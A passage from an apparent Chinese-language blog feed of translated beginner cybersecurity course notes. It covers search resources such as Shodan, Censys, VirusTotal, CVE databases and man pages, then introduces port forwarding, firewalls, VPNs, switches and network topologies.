    &gt;Shodan&lt;/a&gt; 开始，这是一个用于连接到 Internet 的设备的搜索引擎。它允许您搜索特定类型和版本的服务器、网络设备、工业控制系统和 IoT 设备。您可能希望查看仍有多少服务器仍在运行 Apache 2.4.1 以及各个国家/地区的分布情况。要找到答案，我们可以搜索 &lt;code&gt;apache 2.4.1&lt;/code&gt;，它将返回标头中包含字符串“apache 2.4.1”的服务器列表。&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://yerucrembed-1314300122.cos.ap-nanjing.myqcloud.com/img/image-20250324114956212.png&#34;
	
	
	
	loading=&#34;lazy&#34;
	
		alt=&#34;image-20250324114956212&#34;
	
	
&gt;&lt;/p&gt;
&lt;p&gt;考虑访问 Shodan &lt;a class=&#34;link&#34; href=&#34;https://www.shodan.io/search/examples&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;Search Query Examples&lt;/a&gt; 了解更多示例。此外，如果您有订阅，您可以查看 &lt;a class=&#34;link&#34; href=&#34;https://trends.shodan.io/&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;Shodan 趋势&lt;/a&gt;以获取历史见解。&lt;/p&gt;
&lt;h3 id=&#34;censys&#34;&gt;Censys
&lt;/h3&gt;&lt;p&gt;乍一看，&lt;a class=&#34;link&#34; href=&#34;https://search.censys.io/&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;Censys&lt;/a&gt; 似乎与 Shodan 相似。但是，Shodan 专注于连接互联网的设备和系统，例如服务器、路由器、网络摄像头和 IoT 设备。另一方面，Censys 专注于连接 Internet 的主机、网站、证书和其他 Internet 资产。它的一些用例包括枚举正在使用的域、审计开放端口和服务以及发现网络中的流氓资产。您可能需要检查 &lt;a class=&#34;link&#34; href=&#34;https://support.censys.io/hc/en-us/articles/20720064229140-Censys-Search-Use-Cases&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;Censys Search Use Cases&lt;/a&gt;。&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://yerucrembed-1314300122.cos.ap-nanjing.myqcloud.com/img/image-20250324115019928.png&#34;
	
	
	
	loading=&#34;lazy&#34;
	
		alt=&#34;image-20250324115019928&#34;
	
	
&gt;&lt;/p&gt;
&lt;h3 id=&#34;virustotal&#34;&gt;VirusTotal
&lt;/h3&gt;&lt;p&gt;&lt;a class=&#34;link&#34; href=&#34;https://www.virustotal.com/&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;VirusTotal&lt;/a&gt; 是一个在线网站，它使用多个防病毒引擎为文件提供病毒扫描服务。它允许用户上传文件或提供 URL，以便在一次作中针对众多防病毒引擎和网站扫描程序对其进行扫描。他们甚至可以输入文件哈希值来检查以前上传的文件的结果。&lt;/p&gt;
&lt;p&gt;下面的屏幕截图显示了根据 67 个防病毒引擎检查提交的文件的结果。此外，您可以查看社区的评论以获得更多见解。有时，文件可能会被标记为病毒或特洛伊木马程序;但是，由于各种原因，这可能不准确，这时社区成员可以提供更深入的解释。&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://yerucrembed-1314300122.cos.ap-nanjing.myqcloud.com/img/image-20250324115044180.png&#34;
	
	
	
	loading=&#34;lazy&#34;
	
		alt=&#34;image-20250324115044180&#34;
	
	
&gt;&lt;/p&gt;
&lt;h3 id=&#34;have-i-been-pwned&#34;&gt;Have I Been Pwned
&lt;/h3&gt;&lt;p&gt;&lt;a class=&#34;link&#34; href=&#34;https://haveibeenpwned.com/&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;Have I Been Pwned&lt;/a&gt; （HIBP） 只做一件事;它会告诉您电子邮件地址是否出现在数据泄露事件中。在泄露的数据中找到一个人的电子邮件表明私人信息泄露，更重要的是，密码泄露。许多用户在多个平台上使用相同的密码，如果一个平台被泄露，他们在其他平台上的密码也会暴露。事实上，密码通常以加密格式存储;但是，许多密码并不那么复杂，可以使用各种攻击来恢复。&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://yerucrembed-1314300122.cos.ap-nanjing.myqcloud.com/img/image-20250324115103918.png&#34;
	
	
	
	loading=&#34;lazy&#34;
	
		alt=&#34;image-20250324115103918&#34;
	
	
&gt;&lt;/p&gt;
&lt;h2 id=&#34;漏洞和漏洞利用&#34;&gt;漏洞和漏洞利用
&lt;/h2&gt;&lt;h3 id=&#34;cve-漏洞&#34;&gt;CVE 漏洞
&lt;/h3&gt;&lt;p&gt;我们可以将 Common Vulnerabilities and Exposures （CVE） 程序视为漏洞字典。它为软件和硬件产品中的漏洞和安全问题提供标准化标识符。每个漏洞都分配有一个采用标准化格式（如 &lt;code&gt;CVE-2024-29988&lt;/code&gt;）的 CVE ID。此唯一标识符 （CVE ID） 可确保从安全研究人员到供应商和 IT 专业人员的每个人都引用相同的漏洞，在本例中为 &lt;a class=&#34;link&#34; href=&#34;https://nvd.nist.gov/vuln/detail/CVE-2024-29988&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;CVE-2024-29988&lt;/a&gt;。&lt;/p&gt;
&lt;p&gt;MITRE Corporation 维护 CVE 系统。有关更多信息和搜索现有 CVE，请访问 &lt;a class=&#34;link&#34; href=&#34;https://www.cve.org/&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;CVE 计划 &lt;/a&gt;Web 站点。或者，访问&lt;a class=&#34;link&#34; href=&#34;https://nvd.nist.gov/&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;国家漏洞数据库 &lt;/a&gt;（NVD） 网站。下面的屏幕截图显示了 CVE-2014-0160，也称为 Heartbleed。&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://yerucrembed-1314300122.cos.ap-nanjing.myqcloud.com/img/image-20250324115529104.png&#34;
	
	
	
	loading=&#34;lazy&#34;
	
		alt=&#34;image-20250324115529104&#34;
	
	
&gt;&lt;/p&gt;
&lt;h3 id=&#34;漏洞利用数据库&#34;&gt;漏洞利用数据库
&lt;/h3&gt;&lt;p&gt;您想要利用易受攻击的应用程序的原因有很多;一种是将公司的安全性作为其红队的一部分进行评估。不用说，除非我们得到许可，否则我们不应该试图利用易受攻击的系统，通常是通过具有法律约束力的协议。&lt;/p&gt;
&lt;p&gt;现在我们有权利用易受攻击的系统，我们可能需要找到一个有效的漏洞利用代码。一种资源是 &lt;a class=&#34;link&#34; href=&#34;https://www.exploit-db.com/&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;Exploit Database&lt;/a&gt;。漏洞利用数据库列出了来自不同作者的漏洞利用代码;其中一些漏洞利用代码已经过测试并标记为已验证。&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://yerucrembed-1314300122.cos.ap-nanjing.myqcloud.com/img/image-20250324115610601.png&#34;
	
	
	
	loading=&#34;lazy&#34;
	
		alt=&#34;image-20250324115610601&#34;
	
	
&gt;&lt;/p&gt;
&lt;p&gt;&lt;a class=&#34;link&#34; href=&#34;https://github.com/&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;GitHub&lt;/a&gt; 是一个基于 Web 的软件开发平台，可以包含许多与 CVE 相关的工具，以及概念验证 （PoC） 和漏洞利用代码。要演示此想法，请查看下面的 GitHub 上与 Heartbleed 漏洞相关的搜索结果的屏幕截图。&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://yerucrembed-1314300122.cos.ap-nanjing.myqcloud.com/img/image-20250324115636916.png&#34;
	
	
	
	loading=&#34;lazy&#34;
	
		alt=&#34;image-20250324115636916&#34;
	
	
&gt;&lt;/p&gt;
&lt;h2 id=&#34;技术文档&#34;&gt;技术文档
&lt;/h2&gt;&lt;p&gt;需要获得的一项重要技能是查找官方文件。我们将介绍一些官方文档页面的示例。&lt;/p&gt;
&lt;h3 id=&#34;linux-的手册页&#34;&gt;Linux 的手册页
&lt;/h3&gt;&lt;p&gt;早在 Internet 无处不在之前，您如何在 Linux 或类似 Unix 的系统中使用命令获得帮助？答案是检查手册页，简称手册页。在 Linux 和每个类 Unix 系统上，每个命令都应该有一个手册页。事实上，还存在用于系统调用、库函数甚至配置文件的手册页。&lt;/p&gt;
&lt;p&gt;假设我们想检查命令 &lt;code&gt;ip&lt;/code&gt; 的手册页。我们发出命令 &lt;code&gt;man ip&lt;/code&gt;。下面的屏幕截图显示了我们收到的页面。您可能希望启动 AttackBox 并在终端上运行 &lt;code&gt;man ip&lt;/code&gt;。按 &lt;code&gt;q&lt;/code&gt; 退出。&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://yerucrembed-1314300122.cos.ap-nanjing.myqcloud.com/img/image-20250324130417671.png&#34;
	
	
	
	loading=&#34;lazy&#34;
	
		alt=&#34;image-20250324130417671&#34;
	
	
&gt;&lt;/p&gt;
&lt;p&gt;如果您更喜欢在 Web 浏览器中阅读 &lt;code&gt;ip&lt;/code&gt; 的手册页，只需在您最喜欢的搜索引擎中输入 &lt;code&gt;man ip&lt;/code&gt; 即可。&lt;a class=&#34;link&#34; href=&#34;https://linux.die.net/man/8/ip&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt; 此页面&lt;/a&gt;可能位于结果的顶部。&lt;/p&gt;
&lt;h3 id=&#34;microsoft-windows&#34;&gt;Microsoft Windows
&lt;/h3&gt;&lt;p&gt;Microsoft 为其产品提供了官方&lt;a class=&#34;link&#34; href=&#34;https://learn.microsoft.com/&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;技术文档&lt;/a&gt;页面。下面的屏幕截图显示了命令 &lt;code&gt;ipconfig&lt;/code&gt; 的搜索结果。&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://yerucrembed-1314300122.cos.ap-nanjing.myqcloud.com/img/image-20250324130457281.png&#34;
	
	
	
	loading=&#34;lazy&#34;
	
		alt=&#34;image-20250324130457281&#34;
	
	
&gt;&lt;/p&gt;
&lt;h3 id=&#34;产品文档&#34;&gt;产品文档
&lt;/h3&gt;&lt;p&gt;每个流行的产品都应该有组织良好的文档。本文档提供了有关产品特性和功能的官方可靠信息来源。示例包括 &lt;a class=&#34;link&#34; href=&#34;https://www.snort.org/documents&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;Snort 官方文档 &lt;/a&gt;、&lt;a class=&#34;link&#34; href=&#34;https://httpd.apache.org/docs/&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;Apache HTTP 服务器文档 &lt;/a&gt;、&lt;a class=&#34;link&#34; href=&#34;https://www.php.net/manual/en/index.php&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;PHP 文档&lt;/a&gt;和 &lt;a class=&#34;link&#34; href=&#34;https://nodejs.org/docs/latest/api/&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;Node.js 文档 &lt;/a&gt;。&lt;/p&gt;
&lt;p&gt;查看官方文档总是有益的，因为它是最新的并提供最完整的产品信息。&lt;/p&gt;
&lt;h2 id=&#34;社交媒体&#34;&gt;社交媒体
&lt;/h2&gt;&lt;p&gt;有数十亿用户在 &lt;a class=&#34;link&#34; href=&#34;https://www.facebook.com/people/Tryhackme/100069557747714/&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;Facebook&lt;/a&gt;、&lt;a class=&#34;link&#34; href=&#34;https://twitter.com/RealTryHackMe&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;Twitter&lt;/a&gt; 和 &lt;a class=&#34;link&#34; href=&#34;https://www.linkedin.com/company/tryhackme/&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;LinkedIn&lt;/a&gt; 等社交媒体平台上注册。我们希望您熟悉流行的平台。但是，如果您知道任何不熟悉的平台，我们建议您查看并了解它。理想情况下，人们希望在不创建帐户的情况下探索平台;但是，这会严重限制您的体验。相反，一个建议是使用临时电子邮件地址来发现这些平台，而无需将它们链接到您的真实电子邮件地址;完成后，您可以终止账户和关联的电子邮件地址。不使用您的主要帐户的一个原因是，当您只是暂时探索平台时，您不希望您的联系人开始在那里与您联系。&lt;/p&gt;
&lt;p&gt;社交媒体的力量在于它可以让您与您感兴趣的公司和人建立联系。此外，社交媒体为网络安全专业人士提供了丰富的信息，无论他们是搜索人员还是技术信息。你会问为什么搜索人很重要？&lt;/p&gt;
&lt;p&gt;在保护公司时，您应该确保您保护的人不会在社交媒体上过度分享。例如，他们的社交媒体可能会泄露他们秘密问题的答案，例如，“你小时候上过哪所学校？此类信息可能允许攻击者重置其密码并轻松接管其帐户。&lt;/p&gt;
&lt;p&gt;此外，作为网络安全专业人士，您希望随时了解新的网络安全趋势、技术和产品。遵循适当的渠道和小组可以为增长您的技术专业知识提供合适的环境。&lt;/p&gt;
&lt;p&gt;除了通过社交媒体渠道和群组保持更新外，我们还应该提及新闻媒体。数百个新闻网站将提供有价值的网络安全相关新闻。尝试不同的，并坚持你最喜欢的。&lt;/p&gt;
</description>
        </item>
        <item>
        <title>网络扩展</title>
        <link>https://Yerucrem.github.io/p/%E7%BD%91%E7%BB%9C%E6%89%A9%E5%B1%95/</link>
        <pubDate>Mon, 24 Mar 2025 00:00:00 +0000</pubDate>
        
        <guid>https://Yerucrem.github.io/p/%E7%BD%91%E7%BB%9C%E6%89%A9%E5%B1%95/</guid>
        <description>&lt;img src="https://yerucrembed-1314300122.cos.ap-nanjing.myqcloud.com/img/waves-8905720.png" alt="Featured image of post 网络扩展" /&gt;&lt;h1 id=&#34;网络扩展&#34;&gt;网络扩展
&lt;/h1&gt;&lt;h2 id=&#34;端口转发&#34;&gt;端口转发
&lt;/h2&gt;&lt;p&gt;端口转发是将应用程序和服务连接到 Internet 的重要组件。如果没有端口转发，应用程序和服务（如 Web 服务器）只能用于同一直接网络内的设备。&lt;/p&gt;
&lt;p&gt;以下面的网络为例。在此网络中，IP 地址为“192.168.1.10”的服务器在端口 80 上运行 Web 服务器。只有此网络上的其他两台计算机能够访问它（这称为 Intranet）。&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://yerucrembed-1314300122.cos.ap-nanjing.myqcloud.com/img/image-20250324094651577.png&#34;
	
	
	
	loading=&#34;lazy&#34;
	
		alt=&#34;image-20250324094651577&#34;
	
	
&gt;&lt;/p&gt;
&lt;p&gt;如果管理员希望公众可以访问网站（使用 Internet），则必须实施端口转发，如下图所示：&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://yerucrembed-1314300122.cos.ap-nanjing.myqcloud.com/img/image-20250324094705660.png&#34;
	
	
	
	loading=&#34;lazy&#34;
	
		alt=&#34;image-20250324094705660&#34;
	
	
&gt;&lt;/p&gt;
&lt;p&gt;通过这种设计，网络 #2 现在将能够使用网络 #1 的公共 IP 地址 （82.62.51.70） 访问在网络 #1 上运行的 Web 服务器。&lt;/p&gt;
&lt;p&gt;很容易将端口转发与防火墙的行为混淆（我们将在后面的任务中讨论这项技术）。但是，在这个阶段，只需了解端口转发会打开特定端口（回想一下数据包的工作原理）。相比之下，防火墙确定流量是否可以通过这些端口传输（即使这些端口通过端口转发打开）。&lt;/p&gt;
&lt;p&gt;端口转发在网络的路由器上配置。&lt;/p&gt;
&lt;h2 id=&#34;防火墙基础&#34;&gt;防火墙基础
&lt;/h2&gt;&lt;p&gt;&lt;img src=&#34;https://yerucrembed-1314300122.cos.ap-nanjing.myqcloud.com/img/image-20250324094753176.png&#34;
	
	
	
	loading=&#34;lazy&#34;
	
		alt=&#34;image-20250324094753176&#34;
	
	
&gt;&lt;/p&gt;
&lt;p&gt;防火墙是网络中负责确定允许哪些流量进出的设备。将防火墙视为网络的边界安全。管理员可以根据多种因素配置防火墙以允许 或 &lt;strong&gt;拒绝&lt;/strong&gt; 流量进入或退出网络，例如：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;流量来自哪里？（是否告知防火墙接受/拒绝来自特定网络的流量？）&lt;/li&gt;
&lt;li&gt;流量去哪里了？（是否告知防火墙接受/拒绝发往特定网络的流量？）&lt;/li&gt;
&lt;li&gt;流量用于哪个端口？（是否已告知防火墙仅接受/拒绝发往端口 80 的流量？）&lt;/li&gt;
&lt;li&gt;流量使用什么协议？（是否告知防火墙接受/拒绝 UDP、TCP 或两者兼而有之的流量？）&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;防火墙执行数据包检查以确定这些问题的答案。&lt;/p&gt;
&lt;p&gt;防火墙有各种形状和大小。从可以处理大量数据的专用硬件（通常位于企业等大型网络中）到住宅路由器（如您家中）或 &lt;a class=&#34;link&#34; href=&#34;https://www.snort.org/&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;Snort&lt;/a&gt; 等软件，防火墙可分为 2 到 5 类。&lt;/p&gt;
&lt;p&gt;我们将在下表中介绍防火墙的两大主要类别：&lt;/p&gt;
&lt;table&gt;
  &lt;thead&gt;
      &lt;tr&gt;
          &lt;th&gt;&lt;strong&gt;防火墙类别&lt;/strong&gt;&lt;/th&gt;
          &lt;th&gt;&lt;strong&gt;描述&lt;/strong&gt;&lt;/th&gt;
      &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
      &lt;tr&gt;
          &lt;td&gt;Stateful 状态&lt;/td&gt;
          &lt;td&gt;这种类型的防火墙使用来自连接的全部信息;此防火墙不是检查单个数据包，而是&lt;strong&gt;根据整个连接&lt;/strong&gt;确定设备的行为。与无状态防火墙相比，这种防火墙类型会消耗许多资源，因为决策是动态的。例如， 防火墙可能允许 TCP 握手的第一部分，但稍后会失败。如果来自主机的连接错误，它将阻止整个设备。&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;Stateless 无状态&lt;/td&gt;
          &lt;td&gt;此防火墙类型使用一组静态规则来确定&lt;strong&gt;单个数据包&lt;/strong&gt;是否可接受。例如，发送错误数据包的设备并不一定意味着整个设备随后被阻止。虽然这些防火墙使用的资源比其他防火墙少得多，但它们要笨得多。例如，这些防火墙仅对其中定义的规则有效。如果规则不完全匹配，它实际上就毫无用处。 但是，当从一组主机接收大量流量（例如分布式拒绝服务攻击）时，这些防火墙非常有用&lt;/td&gt;
      &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;
&lt;h2 id=&#34;防火墙练习&#34;&gt;防火墙练习
&lt;/h2&gt;&lt;p&gt;恶意流量被标记为红色数据包。合法流量是标记为绿色的数据包。您需要阻止的协议是端口 80。 &lt;strong&gt;配置防火墙 ，防止恶意数据包到达 Web 服务器 203.0.110.1&lt;/strong&gt;。&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://yerucrembed-1314300122.cos.ap-nanjing.myqcloud.com/img/image-20250324095213484.png&#34;
	
	
	
	loading=&#34;lazy&#34;
	
		alt=&#34;image-20250324095213484&#34;
	
	
&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://yerucrembed-1314300122.cos.ap-nanjing.myqcloud.com/img/image-20250324095314842.png&#34;
	
	
	
	loading=&#34;lazy&#34;
	
		alt=&#34;image-20250324095314842&#34;
	
	
&gt;&lt;/p&gt;
&lt;h2 id=&#34;vpn基础知识&#34;&gt;VPN基础知识
&lt;/h2&gt;&lt;p&gt;A &lt;strong&gt;V&lt;/strong&gt;irtual &lt;strong&gt;P&lt;/strong&gt;rivate &lt;strong&gt;N&lt;/strong&gt;etwork（或 简称 &lt;strong&gt;VPN&lt;/strong&gt; ）是一种技术，它允许不同网络上的设备通过通过 Internet 在彼此之间创建专用路径（称为隧道）来安全地通信。在此隧道中连接的设备将形成自己的专用网络。&lt;/p&gt;
&lt;p&gt;例如，只有同一网络（例如企业内部）内的设备才能直接通信。但是，VPN 允许连接两个办公室。让我们看下图，其中有三个网络：&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://yerucrembed-1314300122.cos.ap-nanjing.myqcloud.com/img/image-20250324101129516.png&#34;
	
	
	
	loading=&#34;lazy&#34;
	
		alt=&#34;image-20250324101129516&#34;
	
	
&gt;&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;Network #1 (Office #1)&lt;/li&gt;
&lt;li&gt;Network #2 (Office #2)&lt;/li&gt;
&lt;li&gt;Network #3 （通过 VPN 连接的两台设备）&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;连接在网络 #3 上的设备仍然是网络 #1 和网络 #2 的一部分，但也共同形成一个专用网络（网络 #3），只有通过此 VPN 连接的设备才能通过该网络进行通信。&lt;/p&gt;
&lt;p&gt;让我们在下表中介绍 VPN 提供的其他一些好处：&lt;/p&gt;
&lt;table&gt;
  &lt;thead&gt;
      &lt;tr&gt;
          &lt;th&gt;&lt;strong&gt;效益&lt;/strong&gt;&lt;/th&gt;
          &lt;th&gt;&lt;strong&gt;描述&lt;/strong&gt;&lt;/th&gt;
      &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
      &lt;tr&gt;
          &lt;td&gt;允许连接不同地理位置的网络。&lt;/td&gt;
          &lt;td&gt;例如，拥有多个办事处的企业会发现 VPN 是有益的，因为这意味着可以从另一个办公室访问服务器/基础设施等资源。&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;提供隐私。&lt;/td&gt;
          &lt;td&gt;VPN 技术使用加密来保护数据。这意味着它只能在发送它的设备和目的地之间被理解，这意味着数据不易被嗅探。这种加密在网络不提供加密的公共 WiFi 的地方很有用。您可以使用 VPN 来保护您的流量不被其他人查看。&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;提供匿名&lt;/td&gt;
          &lt;td&gt;记者和活动家依靠 VPN 在言论自由受到控制的国家/地区安全地报道全球问题。通常，您的 ISP 和其他中介可以查看您的流量，因此可以对其进行跟踪。VPN 提供的匿名性级别仅与网络上其他设备尊重隐私的方式一样多。例如，在这方面，记录您所有数据/历史记录的 VPN 与不使用 VPN 本质上相同。&lt;/td&gt;
      &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;
&lt;p&gt;TryHackMe 使用 VPN 将您连接到我们易受攻击的机器，而无需在 Internet 上直接访问它们！这意味着：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;您可以安全地与我们的机器交互&lt;/li&gt;
&lt;li&gt;服务提供商（如 ISP）不会认为您正在攻击 Internet 上的另一台计算机（这可能违反服务条款）&lt;/li&gt;
&lt;li&gt;VPN 为 TryHackMe 提供安全性，因为无法使用 Internet 访问易受攻击的机器。&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;VPN 技术多年来一直在改进。让我们在下面探索一些现有的 VPN 技术：&lt;/p&gt;
&lt;table&gt;
  &lt;thead&gt;
      &lt;tr&gt;
          &lt;th&gt;**VPN Technology **&lt;/th&gt;
          &lt;th&gt;&lt;strong&gt;描述&lt;/strong&gt;&lt;/th&gt;
      &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
      &lt;tr&gt;
          &lt;td&gt;PPP&lt;/td&gt;
          &lt;td&gt;PPTP 使用此技术（如下所述）来允许身份验证并提供数据加密。VPN 通过使用私钥和公有证书（类似于 &lt;strong&gt;SSH&lt;/strong&gt;）来工作。私钥和证书必须匹配才能连接。该技术无法自行离开网络（不可路由）。&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;PPTP&lt;/td&gt;
          &lt;td&gt;（&lt;strong&gt;PPTP&lt;/strong&gt;） 是允许来自 PPP 的数据传输和离开网络的技术。PPTP 非常易于设置，并且大多数设备都支持。但是，与其他选择相比，它的加密较弱。&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;IPSec&lt;/td&gt;
          &lt;td&gt;协议安全 （IPsec） 使用现有的 &lt;strong&gt;I&lt;/strong&gt;nternet &lt;strong&gt;P&lt;/strong&gt;rotocol （&lt;strong&gt;IP&lt;/strong&gt;） 框架对数据进行加密。与其他选择相比，IPSec 很难设置;但是，如果成功，它拥有强大的加密功能，并且许多设备也支持它。&lt;/td&gt;
      &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;
&lt;h2 id=&#34;lan-联网设备&#34;&gt;LAN 联网设备
&lt;/h2&gt;&lt;h3 id=&#34;什么是路由器&#34;&gt;什么是路由器
&lt;/h3&gt;&lt;p&gt;路由器的工作是连接网络并在它们之间传递数据。它通过使用路由来实现这一点（因此得名 router）&lt;/p&gt;
&lt;p&gt;路由是给跨网络传输数据的过程的标签。路由涉及在网络之间创建路径，以便成功传送此数据。路由器在 OSI 模型的第 3 层运行。它们通常具有交互式界面（例如网站或控制台），允许管理员配置各种规则，例如端口转发或防火墙。&lt;/p&gt;
&lt;p&gt;当设备通过许多路径连接时，路由非常有用，例如在下面的示例图中，其中采用最佳路径：&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://yerucrembed-1314300122.cos.ap-nanjing.myqcloud.com/img/image-20250324101806782.png&#34;
	
	
	
	loading=&#34;lazy&#34;
	
		alt=&#34;image-20250324101806782&#34;
	
	
&gt;&lt;/p&gt;
&lt;p&gt;路由器是专用设备，不执行与交换机相同的功能。&lt;/p&gt;
&lt;p&gt;我们可以看到，计算机 A 的网络通过中间的两个路由器连接到计算机 B 的网络。问题是：将采取什么道路？不同的协议将决定应该采取什么路径，但因素包括：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;最短的路径是什么？&lt;/li&gt;
&lt;li&gt;什么路径最可靠？&lt;/li&gt;
&lt;li&gt;哪条路径具有更快的介质（例如铜缆或光纤）？&lt;/li&gt;
&lt;/ol&gt;
&lt;h3 id=&#34;什么是交换机&#34;&gt;什么是交换机
&lt;/h3&gt;&lt;p&gt;交换机是一种专用网络设备，负责提供连接到多个设备的方法。交换机可以使用以太网电缆为许多设备（从 3 到 63 个）提供服务。&lt;/p&gt;
&lt;p&gt;交换机可以在 OSI 模型的第 2 层和第 3 层运行。但是，这些是排他性的，因为第 2 层交换机不能在第 3 层运行。&lt;/p&gt;
&lt;p&gt;以下图中的第 2 层交换机为例。这些交换机将使用帧的 MAC 地址将帧（请记住，这些不再是数据包，因为 IP 协议已被剥离）转发到连接的设备上。&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://yerucrembed-1314300122.cos.ap-nanjing.myqcloud.com/img/image-20250324111004136.png&#34;
	
	
	
	loading=&#34;lazy&#34;
	
		alt=&#34;image-20250324111004136&#34;
	
	
&gt;&lt;/p&gt;
&lt;p&gt;这些交换机仅负责将帧发送到正确的设备。&lt;/p&gt;
&lt;p&gt;现在，让我们来看看第 3 层交换机。这些交换机比第 2 层更复杂，因为它们可以执行  路由器的一些职责。也就是说，这些交换机将帧发送到设备（就像第 2 层一样），并使用 IP 协议将数据包路由到其他设备。&lt;/p&gt;
&lt;p&gt;让我们看一下下图中的第 3 层交换机。我们可以看到有两个 IP 地址：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;192.168.1.1&lt;/li&gt;
&lt;li&gt;192.168.2.1&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;一种称为 &lt;strong&gt;VLAN&lt;/strong&gt; （&lt;strong&gt;V&lt;/strong&gt;irtual &lt;strong&gt;L&lt;/strong&gt;ocal &lt;strong&gt;A&lt;/strong&gt;rea &lt;strong&gt;N&lt;/strong&gt;etwork） 的技术允许对网络内的特定设备进行虚拟拆分。这种拆分意味着他们都可以从 Internet 连接等中受益，但被单独处理。这种网络分离提供了安全性，因为这意味着现有的规则决定了特定设备如何相互通信。这种分离如下图所示：&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://yerucrembed-1314300122.cos.ap-nanjing.myqcloud.com/img/image-20250324111028507.png&#34;
	
	
	
	loading=&#34;lazy&#34;
	
		alt=&#34;image-20250324111028507&#34;
	
	
&gt;&lt;/p&gt;
&lt;p&gt;在上图的上下文中，“销售部门”和“会计部门”将能够访问 Internet，但无法相互通信（尽管它们连接到同一交换机）。&lt;/p&gt;
</description>
        </item>
        <item>
        <title>网络基础</title>
        <link>https://Yerucrem.github.io/p/%E7%BD%91%E7%BB%9C%E5%9F%BA%E7%A1%80/</link>
        <pubDate>Thu, 20 Mar 2025 00:00:00 +0000</pubDate>
        
        <guid>https://Yerucrem.github.io/p/%E7%BD%91%E7%BB%9C%E5%9F%BA%E7%A1%80/</guid>
        <description>&lt;img src="https://yerucrembed-1314300122.cos.ap-nanjing.myqcloud.com/img/background06.jpg" alt="Featured image of post 网络基础" /&gt;&lt;h1 id=&#34;网络基础&#34;&gt;网络基础
&lt;/h1&gt;&lt;h2 id=&#34;lan简介&#34;&gt;LAN简介
&lt;/h2&gt;&lt;p&gt;多年来，已经对各种网络设计进行了实验和实施。对于网络，当我们提到术语 “拓扑” 时，我们实际上指的是手头网络的设计或外观。下面我们来讨论一下这些拓扑的优缺点。&lt;/p&gt;
&lt;h3 id=&#34;星形拓扑&#34;&gt;星形拓扑
&lt;/h3&gt;&lt;p&gt;&lt;img src=&#34;https://yerucrembed-1314300122.cos.ap-nanjing.myqcloud.com/img/image-20250320171027306.png&#34;
	
	
	
	loading=&#34;lazy&#34;
	
		alt=&#34;image-20250320171027306&#34;
	
	
&gt;&lt;/p&gt;
&lt;p&gt;星形拓扑的主要前提是设备通过中央网络设备（如交换机或集线器）单独连接。这种拓扑是当今最常见的拓扑，因为它具有可靠性和可扩展性 - 尽管成本高昂。&lt;/p&gt;
&lt;p&gt;发送到此拓扑中设备的任何信息都通过它所连接的中央设备发送。让我们在下面探讨一下这种拓扑的一些优点和缺点：&lt;/p&gt;
